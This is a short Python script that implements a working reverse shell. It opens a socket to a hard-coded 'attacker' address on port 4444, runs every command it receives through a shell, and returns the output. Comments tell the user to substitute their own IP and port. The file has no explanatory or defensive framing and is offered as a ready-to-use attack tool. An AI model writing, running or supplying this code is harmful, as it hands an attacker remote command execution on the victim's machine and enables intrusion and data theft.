import socket
import subprocess
import os

def reverse_shell():
    attacker_ip = '192.168.35.152'  # Change this to your IP
    attacker_port = 4444         # Change this to your port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    while True:
        # Receive command from attacker
        data = s.recv(1024).decode('utf-8')
        if data.lower() == 'exit':
            break

        # Execute command and send back output
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value if stdout_value else b' ')

    s.close()

if __name__ == '__main__':
    reverse_shell()
